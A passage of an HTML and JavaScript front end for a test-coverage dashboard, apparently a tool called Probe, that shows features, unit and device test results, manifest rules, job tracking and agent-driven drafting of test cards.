id="branch" title="Branch this project is on">\u2026</span>\n  <button class="jobs" id="jobs" hidden></button>\n  <div class="spacer"></div>\n  <nav>\n    <button data-tab="atlas" class="active">Atlas</button>\n    <button data-tab="cards">Cards</button>\n    <button data-tab="verify">Verify</button>\n    <button data-tab="runs">Runs</button>\n    <button data-tab="settings">Settings</button>\n    <button data-tab="setup">Setup</button>\n  </nav>\n</header>\n<div id="banner"></div>\n<main id="view"></main>\n\n<script>\nconst $view = document.getElementById("view");\nconst $meta = document.getElementById("meta");\nconst state = { tab: "atlas", scan: null, filter: "", group: "feature", view: "table", feature: null, eventSource: null, jobs: [] };\n\nconst api = (path, opts) => fetch(path, opts).then((r) => r.json());\nconst esc = (s) => String(s ?? "").replace(/[&<>"]/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", \'"\': "&quot;" })[c]);\nconst ago = (iso) => {\n  if (!iso) return "never";\n  const s = (Date.now() - new Date(iso).getTime()) / 1000;\n  if (s < 60) return "just now";\n  if (s < 3600) return Math.round(s / 60) + "m ago";\n  if (s < 86400) return Math.round(s / 3600) + "h ago";\n  return Math.round(s / 86400) + "d ago";\n};\n\ndocument.querySelectorAll("nav button").forEach((b) => b.addEventListener("click", () => {\n  state.tab = b.dataset.tab; state.feature = null; render();\n}));\n\nfunction closeStream() { if (state.eventSource) { state.eventSource.close(); state.eventSource = null; } }\n\nasync function render() {\n  closeStream();\n  document.querySelectorAll("nav button").forEach((b) => b.classList.toggle("active", b.dataset.tab === state.tab));\n  saveRoute();\n  if (state.tab === "setup") await renderSetup();\n  else if (state.tab === "atlas") await (state.feature ? renderFeature(state.feature) : renderAtlas());\n  else if (state.tab === "cards") await renderCards();\n  else if (state.tab === "verify") await renderVerify();\n  else if (state.tab === "runs") await renderRuns();\n  else if (state.tab === "settings") await renderSettings();\n  showJobs();\n}\n\n// \u2500\u2500 Where the page is, in the address, so a reopened tab comes back to it \u2500\u2500\n\nfunction saveRoute() {\n  const sub = state.tab === "atlas" ? state.feature : state.tab === "cards" ? state.cardFilter?.feature : state.tab === "runs" ? state.runs?.selected : null;\n  history.replaceState(null, "", "#" + state.tab + (sub ? "/" + encodeURIComponent(sub) : ""));\n}\n\nfunction loadRoute() {\n  const m = /^#(atlas|cards|verify|runs|settings|setup)(?:\\/(.+))?$/.exec(location.hash);\n  if (!m) return false;\n  goTo({ tab: m[1], feature: m[2] ? decodeURIComponent(m[2]) : null });\n  return true;\n}\n\nfunction goTo(route) {\n  state.tab = route.tab;\n  state.feature = route.tab === "atlas" ? route.feature || null : null;\n  if (route.tab === "runs") runsState().selected = route.feature || null;\n  if (route.tab === "cards" && route.feature) state.cardFilter = { side: "all", q: "", level: "all", status: "all", ...state.cardFilter, feature: route.feature };\n}\n\n// \u2500\u2500 Jobs: work the server is doing (drafting cards, unit runs, verify\u2026), whoever started it \u2500\u2500\n// The server is the record. A page opened mid-run asks for it, marks the buttons that started\n// it as busy and follows the run, so closing the tab never hides work that is still going.\n\n/** The same keys as the server\'s jobKeys (src/studio/jobs.ts). */\nconst jobKey = {\n  unit: (f) => `unit:${f}`,\n  backfill: (f) => `backfill:${f}`,\n  explore: (f) => `explore:${f}`,\n  unitwrite: (f) => `unitwrite:${f}`,\n  card: (f, id) => `card:${f}/${id}`,\n  login: (role) => `login:${role || "check"}`,\n  verifyFeatures: (fs) => `verify:features:${[...fs].sort().join(",")}`,\n  verifyOutdated: (fs) => `verify:outdated${fs && fs.length ? ":" + [...fs].sort().join(",") : ""}`,\n  verifyBase: (base) => `verify:base:${base || ""}`,\n};\n\n/** Where a job\'s button lives, to open the page on it. */\nfunction routeOf(j) {\n  const [kind, ...rest] = j.key.split(":");\n  const arg = rest.join(":");\n  if (kind === "init") return { tab: "setup" };\n  if (kind === "login") return { tab: "settings" };\n  if (kind === "check") return { tab: "atlas" };\n  if (kind === "verify") {\n    if (arg === "outdated") return { tab: "atlas" };\n    if (arg.startsWith("outdated:") && !arg.includes(",")) return { tab: "cards", feature: arg.slice(9) };\n    if (arg.startsWith("features:") && !arg.includes(",")) return { tab: "atlas", feature: arg.slice(9) };\n    return { tab: "verify" };\n  }\n  if (kind === "backfill" && arg.startsWith("ticket:")) return { tab: "verify" };\n  if (kind === "backfill" && j.feature === "*") return { tab: "cards" };\n  if (["unit", "backfill", "explore", "unitwrite", "card"].includes(kind) && j.feature !== "*") return { tab: "atlas", feature: j.feature };\n  // The Runs tab opens the run itself beside the list.\n  return { tab: "runs", feature: j.runId };\n}\n\nfunction onRoute(route) {\n  if (route.tab !== state.tab) return false;\n  if (route.tab === "atlas") return (route.feature || null) === state.feature;\n  if (route.tab === "cards") return !route.feature || route.feature === state.cardFilter?.feature;\n  return true;\n}\n\nconst jobLabel = (j) => `${j.kind} ${j.kind === "card" ? `${j.feature}/${j.cardId}` : j.feature === "*" ? "" : j.feature} \xB7 started ${ago(j.startedAt)}`;\n\nasync function refreshJobs() {\n  const jobs = await api("/api/jobs").catch(() => null);\n  if (!jobs) return;\n  state.jobs = jobs.filter((j) => !j.child);\n  showJobs();\n}\n\n/** Reflects the jobs on the page: the header count, busy buttons, and a run to follow. */\nfunction showJobs() {\n  const chip = document.getElementById("jobs");\n  chip.hidden = !state.jobs.length;\n  chip.textContent = `\u25CF ${state.jobs.length} running`;\n  chip.title = state.jobs.map(jobLabel).join("\\n") + "\\nClick to open the latest";\n  const running = new Set(state.jobs.map((j) => j.key));\n  document.querySelectorAll("[data-job]").forEach((b) => {\n    if (b.dataset.label === undefined && !b.disabled) b.dataset.label = b.textContent;\n    if (running.has(b.dataset.job)) {\n      if (b.dataset.marked) return;\n      b.dataset.marked = "1";\n      b.disabled = true;\n      if (b.dataset.busy) b.textContent = b.dataset.busy;\n    } else if (b.dataset.marked) {\n      delete b.dataset.marked;\n      b.disabled = false;\n      if (b.dataset.label !== undefined) b.textContent = b.dataset.label;\n    }\n  });\n  followJob();\n}\n\n/** Into an empty run panel: the run asked for, else the latest job this view started. */\nfunction followJob() {\n  const panel = document.getElementById("runpanel");\n  if (!panel || panel.innerHTML.trim() || state.eventSource) return;\n  if (state.showRun) {\n    const id = state.showRun;\n    state.showRun = null;\n    return followRun(id, panel);\n  }\n  const wanted = state.followId && state.jobs.find((j) => j.runId === state.followId);\n  state.followId = null;\n  const job = wanted || (state.tab !== "runs" && [...state.jobs].reverse().find((j) => onRoute(routeOf(j))));\n  // When it ends, the view reloads with what it made and shows the finished run again.\n  if (job) followRun(job.runId, panel, () => { state.scan = null; state.showRun = job.runId; render(); });\n}\n\ndocument.getElementById("jobs").addEventListener("click", () => {\n  const j = state.jobs[state.jobs.length - 1];\n  if (!j) return;\n  goTo(routeOf(j));\n  state.followId = j.runId;\n  render();\n});\nsetInterval(refreshJobs, 3000);\n\nfunction coverageBar(s) {\n  const t = Math.max(1, s.testable);\n  const w = (n) => (100 * n / t).toFixed(1) + "%";\n  return `<div class="bar" title="${s.direct} direct \xB7 ${s.referenced} referenced \xB7 ${s.untested} untested">\n    <span style="width:${w(s.direct)};background:var(--ok)"></span>\n    <span style="width:${w(s.referenced)};background:var(--warn)"></span>\n  </div>`;\n}\n\nfunction runPill(r) {\n  if (!r) return `<span class="pill none">not run</span>`;\n  const label = r.status === "running" || r.status === "error" ? r.status : `${r.tests - r.failed}/${r.tests}`;\n  return `<span class="pill ${r.status}" title="${esc(r.finishedAt || "")}${esc(whoRan(r))}">${label}</span>${freshPill(r)} <span class="muted">${ago(r.finishedAt)}</span>`;\n}\n\nconst HEALTH_LABEL = { ok: "ok", warn: "warn", fail: "fail", unknown: "never run" };\nfunction healthPill(f) {\n  return `<span class="pill h-${f.health}" title="${esc(f.reasons.join("\\n"))}">${HEALTH_LABEL[f.health]}</span>`;\n}\n\nfunction devicePill(d) {\n  const ran = d.passed + d.failed + d.blocked + d.error;\n  if (!ran && d.stale) return `<span class="pill warn" title="${d.stale} card results outdated: code or card changed since">\u27F3 ${d.stale} outdated</span>`;\n  if (!ran) return d.notRun ? `<span class="pill none" title="${d.notRun} cards never run on a device">not run</span>` : `<span class="muted">\u2014</span>`;\n  const cls = d.failed ? "failed" : d.blocked || d.error ? "blocked" : "passed";\n  return `<span class="pill ${cls}" title="${d.passed} passed \xB7 ${d.failed} failed \xB7 ${d.blocked} blocked \xB7 ${d.error} error \xB7 ${d.stale} outdated \xB7 ${d.maybe} maybe outdated \xB7 ${d.notRun} not run">${d.passed}/${ran + d.stale + d.notRun}</span>${d.stale ? ` <span class="pill warn" title="${d.stale} card results outdated: code or card changed since">\u27F3 ${d.stale}</span>` : ""}`;\n}\n\n/** Marks a result that no longer holds for the code checked out here. */\nfunction freshPill(r) {\n  if (!r || !r.fresh || r.fresh === "fresh" || r.fresh === "never") return "";\n  const why = (r.freshReasons || []).join("\\n");\n  return r.fresh === "stale"\n    ? ` <span class="pill warn" title="Outdated: ${esc(why)}">\u27F3 outdated</span>`\n    : ` <span class="pill none" title="Maybe outdated: ${esc(why)}">? maybe</span>`;\n}\n\nfunction whoRan(r) {\n  return r.remote ? ` \xB7 recorded by ${r.by || "someone else"} (no evidence on this machine)` : "";\n}\n\nfunction lastRunPill(r) {\n  if (!r) return `<span class="pill none" title="never run on a device">not run</span>`;\n  return `<span class="pill ${r.status}" title="last device run ${esc(r.runId)}, ${esc(r.at || "")}${esc(whoRan(r))}">${r.status}</span>${freshPill(r)}${r.perfIssues ? ` <span class="pill warn" title="performance warnings">perf</span>` : ""}`;\n}\n\nconst GROUP_LABEL = { feature: "Features", platform: "Platform areas", all: "Features and areas" };\n\n/** A feature\'s or platform area\'s manifest: its rules, and how many nothing proves yet. */\nfunction manifestPill(f) {\n  const m = f.manifest;\n  if (!m) return `<span class="pill none" title="No manifest yet: Setup \u2192 Feature knowledge drafts one">none</span>`;\n  return `<span class="pill ${m.unproven ? "warn" : "ok"}" title="${m.rules} rules \xB7 ${m.unproven} unproven">${m.rules} rule${m.rules === 1 ? "" : "s"}${m.unproven ? ` \xB7 ${m.unproven} unproven` : ""}</span>`;\n}\n\nfunction cardsPill(c) {\n  if (!c) return `<span class="pill none">none</span>`;\n  const title = `${c.approved} approved \xB7 ${c.draft} draft \xB7 ${c.rejected} rejected`;\n  return `<span class="pill ${c.draft ? "warn" : "ok"}" title="${title}">${c.total}${c.draft ? ` \xB7 ${c.draft} to review` : ""}</span>`;\n}\n\n/** Features whose unit or card results are outdated: what "Bring up to date" would re-run. */\nfunction outdatedCount(features) {\n  return features.filter((f) => f.device.stale || f.device.maybe || f.unit?.fresh === "stale" || f.unit?.fresh === "maybe").length;\n}\n\nasync function loadScan(refresh) {\n  state.scan = await api("/api/scan", { method: refresh ? "POST" : "GET" });\n  const p = state.scan.project;\n  $meta.textContent = `${p.name} \xB7 ${p.adapter} \xB7 scanned ${ago(state.scan.scannedAt)}`;\n}\n\nasync function renderAtlas() {\n  if (!state.scan) { $view.innerHTML = `<div class="empty">Scanning project\u2026</div>`; await loadScan(false); }\n  const watch = await api("/api/watch");\n  const all = state.scan.features;\n  const list = all\n    .filter((f) => state.group === "all" || f.group === state.group)\n    .filter((f) => f.id.toLowerCase().includes(state.filter.toLowerCase()));\n  const sum = (k) => list.reduce((n, f) => n + f.stats[k], 0);\n  const testable = sum("testable");\n  const pct = (n) => testable ? Math.round(100 * n / testable) + "%" : "\u2013";\n\n  $view.innerHTML = `\n    <div class="cards">\n      <div class="card"><div class="k">${GROUP_LABEL[state.group]}</div><div class="v">${list.length}</div></div>\n      <div class="card"><div class="k">With a manifest</div><div class="v">${list.filter((f) => f.manifest).length}</div></div>\n      <div class="card"><div class="k">Testable classes</div><div class="v">${testable}</div></div>\n      <div class="card"><div class="k">Have a test class</div><div class="v" style="color:var(--ok)">${pct(sum("direct"))}</div></div>\n      <div class="card"><div class="k">Only referenced</div><div class="v" style="color:var(--warn)">${pct(sum("referenced"))}</div></div>\n      <div class="card"><div class="k">Untested</div><div class="v" style="color:var(--fail)">${pct(sum("untested"))}</div></div>\n      <div class="card"><div class="k">Health</div><div class="v" style="font-size:15px;margin-top:6px">${["ok", "warn", "fail", "unknown"].map((h) => `<span class="pill h-${h}">${list.filter((f) => f.health === h).length} ${HEALTH_LABEL[h]}</span>`).join(" ")}</div></div>\n    </div>\n    <div class="toolbar">\n      <div class="seg" id="view"><button data-v="table">Table</button><button data-v="map">Map</button></div>\n      <input type="search" id="filter" placeholder="Filter\u2026" value="${esc(state.filter)}">\n      <div class="seg" id="group">\n        <button data-g="feature">Features</button><button data-g="platform">Platform</button><button data-g="all">All</button>\n      </div>\n      <div class="legend hide-sm"><span><span class="dot" style="background:var(--ok)"></span>test class</span><span><span class="dot" style="background:var(--warn)"></span>referenced in tests</span><span><span class="dot" style="background:var(--track)"></span>untested</span></div>\n      <div style="flex:1"></div>\n      ${outdatedCount(all) ? `<button class="btn" id="uptodate" data-job="${esc(jobKey.verifyOutdated())}" data-busy="Bringing up to date\u2026" title="Re-runs only results that are outdated, maybe outdated or missing for this code: unit tests, then cards on a device">\u27F3 Bring ${outdatedCount(all)} feature${outdatedCount(all) === 1 ? "" : "s"} up to date</button>` : ""}\n      <button class="btn secondary" id="rescan">Rescan</button>\n    </div>\n    ${watchBanner(watch)}\n    <div id="runpanel"></div>\n    ${state.scan.excluded.length ? `<p class="muted">Excluded by probe.yaml: ${state.scan.excluded.map(esc).join(", ")}</p>` : ""}\n    ${state.view === "map" ? `<div class="map">${list.map((f) => `<div class="tile h-${f.health}" data-id="${esc(f.id)}" title="${esc(f.reasons.join("\\n"))}">\n        <strong>${esc(f.id)}${stalePill(watch, f.id)}</strong>\n        <div class="sig"><span>${f.manifest ? `${f.manifest.rules} rules` : "no manifest"}</span>${f.group === "platform" && f.usedBy ? `<span>used by ${f.usedBy}</span>` : ""}<span>unit ${f.unit ? (f.unit.failed ? `\u2717${f.unit.failed}` : "\u2713") : "\u2014"}</span><span>${f.stats.testable ? Math.round(100 * f.stats.direct / f.stats.testable) : 0}% classes</span><span>cards ${f.cards ? f.cards.total : 0}</span><span>device ${f.device.passed}/${f.device.passed + f.device.failed + f.device.blocked + f.device.error + f.device.notRun}</span>${f.nav ? `<span>${f.nav.screens} screens</span>` : ""}</div>\n        <div class="why">${esc(f.reasons[0] || (f.health === "ok" ? "all checks passed" : ""))}</div>\n      </div>`).join("") || `<div class="empty">Nothing matches.</div>`}</div>` : `\n    <table>\n      <thead><tr>\n        <th>${state.group === "platform" ? "Platform area" : state.group === "all" ? "Feature or area" : "Feature"}</th><th class="num hide-sm">Modules</th><th class="num">Testable</th><th>Unit coverage (static)</th>\n        <th class="num hide-sm">Untested</th><th>Manifest</th><th>Cards</th><th>Last unit run</th><th>On device</th><th>Health</th>\n      </tr></thead>\n      <tbody>\n        ${list.map((f) => `<tr class="click" data-id="${esc(f.id)}">\n          <td><strong>${esc(f.id)}</strong>${stalePill(watch, f.id)}${f.group === "platform" && f.usedBy ? `<div class="muted" style="font-size:11px">used by ${f.usedBy}</div>` : ""}</td>\n          <td class="num hide-sm">${f.stats.modules}</td>\n          <td class="num">${f.stats.testable}</td>\n          <td><div class="row">${coverageBar(f.stats)}<span class="muted">${f.stats.testable ? Math.round(100 * f.stats.direct / f.stats.testable) : 0}%</span></div></td>\n          <td class="num hide-sm">${f.stats.untested}</td>\n          <td>${manifestPill(f)}</td>\n          <td>${cardsPill(f.cards)}</td>\n          <td>${runPill(f.lastUnitRun)}</td>\n          <td>${devicePill(f.device)}</td>\n          <td>${healthPill(f)}</td>\n        </tr>`).join("") || `<tr><td colspan="10" class="empty">Nothing matches.</td></tr>`}\n      </tbody>\n    </table>`}`;\n\n  const filter = document.getElementById("filter");\n  filter.addEventListener("input", () => { state.filter = filter.value; renderAtlas().then(() => { const f = document.getElementById("filter"); f.focus(); f.setSelectionRange(f.value.length, f.value.length); }); });\n  document.querySelectorAll("#group button").forEach((b) => {\n    b.classList.toggle("active", b.dataset.g === state.group);\n    b.addEventListener("click", () => { state.group = b.dataset.g; renderAtlas(); });\n  });\n  document.getElementById("uptodate")?.addEventListener("click", async (e) => {\n    if (!confirm("Re-run every outdated or missing result? Unit tests run first, then approved cards on an emulator (at most the max card runs from Settings).")) return;\n    e.target.disabled = true;\n    const res = await post("/api/verify", { outdated: true });\n    if (res.error) { alert(res.error); e.target.disabled = false; return; }\n    followRun(res.runId, document.getElementById("runpanel"), () => { state.scan = null; });\n  });\n  document.getElementById("rescan").addEventListener("click", async (e) => {\n    e.target.disabled = true; e.target.textContent = "Scanning\u2026";\n    await loadScan(true); renderAtlas();\n  });\n  document.querySelectorAll("#view button").forEach((b) => {\n    b.classList.toggle("active", b.dataset.v === state.view);\n    b.addEventListener("click", () => { state.view = b.dataset.v; renderAtlas(); });\n  });\n  document.querySelectorAll("tr.click, .tile").forEach((tr) => tr.addEventListener("click", () => { state.feature = tr.dataset.id; render(); }));\n  bindWatchBanner(() => renderAtlas());\n}\n\n// \u2500\u2500 Keeping features current: stale marks, the check, drafted corrections \u2500\u2500\n\nfunction stalePill(watch, id) {\n  const e = watch.stale[id];\n  if (!e) return "";\n  // Reached through the module graph: none of its own files changed, code it depends on did.\n  const via = !e.owned && e.dependsOn?.length ? e.dependsOn : null;\n  return ` <span class="pill warn" title="${via ? `Depends on ${esc(via.join(", "))}, edited` : "Edited"} since its last check (${esc(e.sources.join(", "))}, ${ago(e.last)}):\\n${esc(e.files.slice(0, 12).join("\\n"))}">${via ? "dependency edited" : "edited"}</span>`;\n}\n\nfunction watchBanner(watch) {\n  if (!watch.enabled) return "";\n  const stale = Object.keys(watch.stale);\n  const parts = [];\n  if (watch.running) parts.push(`<span class="pill running">checking</span> <a href="#" data-follow="${esc(watch.running.runId)}">run ${esc(watch.running.runId)}</a>`);\n  if (stale.length) parts.push(`${stale.length} feature${stale.length === 1 ? "" : "s"} edited since their last check: ${stale.map((id) => `<strong>${esc(id)}</strong>`).join(", ")}`);\n  if (watch.drafts.length) parts.push(`${watch.drafts.length} drafted correction${watch.drafts.length === 1 ? "" : "s"} to review: ${watch.drafts.map((d) => `<a href="#" data-feature="${esc(d.feature)}">${esc(d.feature)}</a>`).join(", ")}`);\n  if (!parts.length) return "";\n  return `<div class="box stale"><div class="row" style="flex-wrap:wrap">${parts.map((p) => `<span>${p}</span>`).join(\'<span class="muted">\xB7</span>\')}<div style="flex:1"></div>${stale.length && !watch.running ? `<button class="btn secondary" id="checknow" title="Unit tests and manifest links of the edited features, then drafted corrections for review">\u2713 Check now</button>` : ""}</div></div>`;\n}\n\nfunction bindWatchBanner(refresh) {\n  document.querySelectorAll("[data-follow]").forEach((a) => a.addEventListener("click", (e) => { e.preventDefault(); followRun(a.dataset.follow, document.getElementById("runpanel"), refresh); }));\n  document.querySelectorAll("[data-feature]").forEach((a) => a.addEventListener("click", (e) => { e.preventDefault(); state.feature = a.dataset.feature; render(); }));\n  document.getElementById("checknow")?.addEventListener("click", async (e) => {\n    e.target.disabled = true;\n    const res = await post("/api/watch/check", {});\n    if (res.error) { alert(res.error); e.target.disabled = false; return; }\n    followRun(res.runId, document.getElementById("runpanel"), refresh);\n  });\n}\n\n/** Just enough markdown for a brief\'s At a glance: bullets, bold, code, links as text. */\nfunction miniMd(text) {\n  const inline = (t) => esc(t).replace(/\\*\\*(.+?)\\*\\*/g, "<strong>$1</strong>").replace(/`([^`]+)`/g, "<code>$1</code>").replace(/\\[([^\\]]+)\\]\\([^)]+\\)/g, "$1");\n  const items = [];\n  for (const line of text.split("\\n")) {\n    if (/^\\s*[-*] /.test(line)) items.push(line.replace(/^\\s*[-*] /, ""));\n    else if (items.length && line.trim()) items[items.length - 1] += " " + line.trim();\n  }\n  return items.length ? `<ul>${items.map((i) => `<li>${inline(i)}</li>`).join("")}</ul>` : `<p>${inline(text)}</p>`;\n}\n\nfunction diffHtml(diff) {\n  return `<pre class="diff">${diff.split("\\n").map((l) => `<span class="${l.startsWith("@@") ? "hunk" : l.startsWith("+") ? "add" : l.startsWith("-") ? "del" : ""}">${esc(l)}</span>`).join("\\n")}</pre>`;\n}\n\nasync function renderKnowledge(id) {\n  const k = await api("/api/knowledge/" + encodeURIComponent(id));\n  // Looked up after the fetch: the page may have re-rendered while it loaded.\n  const el = document.getElementById("knowledge");\n  if (!el) return;\n  const title = k.kind === "platform" ? "Platform area knowledge" : "Feature knowledge";\n  // Who builds on whom, from the build files: an edit in a platform area makes its users stale.\n  const links = [k.usedBy?.length ? `Used by ${k.usedBy.length}: ${k.usedBy.map(esc).join(", ")}` : "", k.uses?.length ? `Uses: ${k.uses.map(esc).join(", ")}` : ""].filter(Boolean);\n  const linksHtml = links.length ? `<div class="muted" style="font-size:12px;margin-top:6px">${links.join(" \xB7 ")}</div>` : "";\n  if (!k.manifest && !k.check && k.drafts.length) {\n    el.innerHTML = `<div class="box"><h3>${title}</h3><span class="muted">No manifest yet; one is drafted. Review it in <a href="#" id="gosetup">Setup</a>.</span>${linksHtml}</div>`;\n    el.querySelector("#gosetup").addEventListener("click", (e) => { e.preventDefault(); state.tab = "setup"; state.feature = null; render(); });\n    return;\n  }\n  if (!k.manifest && !k.check) {\n    el.innerHTML = `<div class="box"><h3>${title}</h3><span class="muted">No manifest yet. Run <code class="mono">probe init</code> (or Setup \u2192 Feature knowledge) to draft one, or write <code class="mono">${esc(k.file)}</code> by hand (format in <code class="mono">probe/features/README.md</code>). It gives ${k.kind === "platform" ? "this area a summary, the contract it keeps for the code built on it" : "this feature a summary, its rules"} and the tests that prove them; Probe then keeps them in step with the code.</span>${linksHtml}</div>`;\n    return;\n  }\n  const m = k.manifest || {};\n  const c = k.check || { broken: [], gaps: [], errors: [], unexplained: [], missingPaths: [], links: 0 };\n  const brokenBy = {};\n  for (const b of c.broken) (brokenBy[b.invariant] ||= []).push(b);\n  const brokenCardsBy = {};\n  for (const b of c.brokenCards || []) (brokenCardsBy[b.invariant] ||= []).push(b);\n  // A card proves its rule only while its last pass still holds for this code.\n  const cardPill = (x) => {\n    const cls = x.freshness === "missing" || x.result === "failed" ? "fail" : x.result === "passed" && x.freshness === "fresh" ? "ok" : "warn";\n    const run = x.freshness === "missing" ? "" : ` <button class="btn secondary" style="padding:1px 8px;font-size:11px" data-runcard="${esc(x.feature)}/${esc(x.id)}" data-job="${esc(jobKey.card(x.feature, x.id))}" data-busy="\u2026" title="Run this card on a device">\u25B6</button>`;\n    return `<div style="margin:2px 0"><span class="pill ${cls}" title="${esc(x.text)}">card ${esc(x.id)}</span> <span class="muted" style="font-size:12px">${esc(x.title || "")} \xB7 ${esc(x.text)}</span>${run}</div>`;\n  };\n  const proof = (inv) => {\n    const broken = brokenBy[inv.id] || [];\n    const pills = [];\n    if (inv.coveredBy.length) pills.push(`<span class="pill ${broken.length ? "fail" : "ok"}" title="${esc(inv.coveredBy.join("\\n"))}">${inv.coveredBy.length - broken.length}/${inv.coveredBy.length} tests</span>`);\n    const cards = (k.cards || {})[inv.id] || [];\n    if (!inv.coveredBy.length && !cards.length) pills.push(`<span class="pill ${inv.gap ? "warn" : "fail"}" title="${esc(inv.gap || "no test, no card and no reason given")}">${inv.gap ? "unproven" : "unexplained"}</span>`);\n    return pills.join(" ") + cards.map(cardPill).join("") +\n      broken.map((b) => `<div class="muted" style="font-size:12px">\u2717 ${esc(b.entry)} \u2014 ${esc(b.problem)}${b.closest ? `; closest: \u201C${esc(b.closest)}\u201D` : ""}</div>`).join("") +\n      (brokenCardsBy[inv.id] || []).map((b) => `<div class="muted" style="font-size:12px">\u2717 card ${esc(b.card)} \u2014 no such card${b.closest ? `; closest: \u201C${esc(b.closest)}\u201D` : ""}</div>`).join("");\n  };\n  el.innerHTML = `\n    ${k.stale ? `<div class="box stale"><div class="row" style="flex-wrap:wrap"><span><span class="pill warn">${!k.stale.owned && k.stale.dependsOn?.length ? `depends on ${esc(k.stale.dependsOn.join(", "))}` : "edited"}</span> since its last check, ${ago(k.stale.last)} (${esc(k.stale.sources.join(", "))}): <span class="mono">${esc(k.stale.files.slice(0, 6).join(", "))}${k.stale.files.length > 6 ? ` +${k.stale.files.length - 6}` : ""}</span></span><div style="flex:1"></div><button class="btn secondary" id="checkfeature" data-job="check" data-busy="Checking\u2026">\u2713 Check now</button></div></div>` : ""}\n    ${k.drafts.map((d) => `<div class="box stale"><h3>Drafted correction <span class="muted" style="font-weight:400">\xB7 ${ago(d.createdAt)}${d.runId ? ` \xB7 check ${esc(d.runId)}` : ""}</span></h3>\n      <p style="margin:4px 0 8px">${esc(d.summary)}</p>\n      ${d.diffs.map((x) => `<div class="mono muted">${esc(x.path)}${x.conflict ? ` <span class="pill fail">changed since the draft was made</span>` : ""}</div>${diffHtml(x.diff)}`).join("")}\n      <div class="row"><button class="btn" data-approve="${esc(d.id)}" ${d.diffs.some((x) => x.conflict) ? "disabled" : ""}>Apply</button><button class="btn secondary" data-reject="${esc(d.id)}">Reject</button></div></div>`).join("")}\n    <div class="box"><h3>${esc(m.name || id)} ${k.kind === "platform" ? `<span class="pill none">platform</span> ` : ""}${m.owner ? `<span class="muted" style="font-weight:400">\xB7 owner ${esc(m.owner)}</span>` : `<span class="pill warn" title="Nobody approves changes to this feature\'s manifest and brief yet">no owner</span>`}</h3>\n      ${m.summary ? `<p style="margin:0 0 8px">${esc(m.summary)}</p>` : ""}\n      ${k.glance ? `<div class="glance">${miniMd(k.glance)}</div>` : ""}\n      <div class="muted" style="font-size:12px;margin-top:6px">${m.brief ? `Brief <span class="mono">${esc(m.brief)}</span> \xB7 ` : ""}manifest <span class="mono">${esc(k.file)}</span> \xB7 ${c.links} test links \xB7 ${c.cardLinks || 0} card links${c.broken.length + (c.brokenCards || []).length ? ` \xB7 <strong style="color:var(--fail)">${c.broken.length + (c.brokenCards || []).length} broken</strong>` : ""}</div>\n      ${linksHtml}\n      ${[...c.errors, ...c.missingPaths.map((p) => `path does not exist: ${p}`), ...c.unexplained.map((u) => `${u}: no test, no card and no gap given`)].map((e) => `<div style="color:var(--fail);font-size:12px">\u2717 ${esc(e)}</div>`).join("")}\n    </div>\n    ${m.invariants?.length ? `<details class="fc" ${c.broken.length ? "open" : ""}><summary><strong>Rules that must hold</strong> <span class="muted">${m.invariants.length} rules \xB7 ${c.gaps.length} unproven${c.broken.length ? ` \xB7 ${c.broken.length} broken links` : ""}</span></summary><div class="fc-body">\n      <table><thead><tr><th>Rule</th><th>Proved by</th></tr></thead><tbody>${m.invariants.map((inv) => `<tr><td><strong class="mono" style="font-size:12px">${esc(inv.id)}</strong><div>${esc(inv.rule)}</div></td><td>${proof(inv)}</td></tr>`).join("")}</tbody></table></div></details>` : ""}\n    ${m.flows?.length ? `<details class="fc"><summary><strong>User flows</strong> <span class="muted">${m.flows.length}</span></summary><div class="fc-body"><ul>${m.flows.map((f) => `<li><span class="mono muted">${esc(f.id)}</span> ${esc(f.text)}</li>`).join("")}</ul>${m.deviceOnly?.length ? `<div class="k">Only on a device</div><ul>${m.deviceOnly.map((d) => `<li>${esc(d)}</li>`).join("")}</ul>` : ""}</div></details>` : ""}`;\n  el.querySelectorAll("[data-runcard]").forEach((b) => b.addEventListener("click", async () => {\n    const at = b.dataset.runcard.lastIndexOf("/");\n    b.disabled = true; b.textContent = "\u2026";\n    const res = await api(`/api/cards/${encodeURIComponent(b.dataset.runcard.slice(0, at))}/${encodeURIComponent(b.dataset.runcard.slice(at + 1))}/run`, { method: "POST" });\n    if (res.error) { alert(res.error); b.disabled = false; b.textContent = "\u25B6"; return; }\n    followRun(res.runId, document.getElementById("runpanel"), () => renderKnowledge(id));\n  }));\n  document.getElementById("checkfeature")?.addEventListener("click", async (e) => {\n    e.target.disabled = true; e.target.textContent = "Checking\u2026";\n    const res = await post("/api/watch/check", { features: [id] });\n    if (res.error) { alert(res.error); e.target.disabled = false; e.target.textContent = "\u2713 Check now"; return; }\n    followRun(res.runId, document.getElementById("runpanel"), () => renderKnowledge(id));\n  });\n  showJobs();\n  el.querySelectorAll("[data-approve],[data-reject]").forEach((b) => b.addEventListener("click", async () => {\n    const approve = !!b.dataset.approve;\n    const draftId = b.dataset.approve || b.dataset.reject;\n    if (approve && !confirm("Write this correction into the manifest/brief? Nothing is committed.")) return;\n    b.disabled = true;\n    const res = await post(`/api/drafts/${encodeURIComponent(draftId)}/${approve ? "approve" : "reject"}`, {});\n    if (!res.ok) alert(res.error);\n    renderKnowledge(id);\n  }));\n}\n\nasync function renderFeature(id) {\n  $view.innerHTML = `<div class="empty">Loading ${esc(id)}\u2026</div>`;\n  const [f, navmap] = await Promise.all([api("/api/feature/" + encodeURIComponent(id)), api("/api/navmap")]);\n  // A remembered address can name a feature that is gone since.\n  if (f.error) { state.feature = null; return render(); }\n  if (!state.scan) await loadScan(false);\n  const h = state.scan.features.find((x) => x.id === f.id);\n  const nav = navmap[f.id];\n  const s = f.stats;\n  const withTests = f.modules.filter((m) => m.unitTestTask).length;\n  $view.innerHTML = `\n    <button class="back" id="back">\u2190 Atlas</button>\n    <div class="toolbar"><h2 style="margin:0">${esc(f.id)}</h2><span class="pill none">${f.group}</span><div style="flex:1"></div>\n      <button class="btn secondary" id="backfill" data-job="${esc(jobKey.backfill(f.id))}" data-busy="Agent drafting\u2026" title="A background agent reads code, docs and git history and drafts cards">\u2726 Draft cards</button>\n      <button class="btn secondary" id="explore" data-job="${esc(jobKey.explore(f.id))}" data-busy="Agent mapping\u2026" ${noDevices() ? `disabled title="${esc(noDevices())}"` : `title="An agent walks this feature\'s screens on an emulator and maps how each is reached"`}>\u2316 Map screens</button>\n      <button class="btn secondary" id="unitwrite" data-job="${esc(jobKey.unitwrite(f.id))}" data-busy="Agent writing tests\u2026" ${f.gaps.length ? "" : "disabled"} title="An agent writes unit tests for the riskiest untested classes, then runs them">\u270E Write missing tests</button>\n      <button class="btn 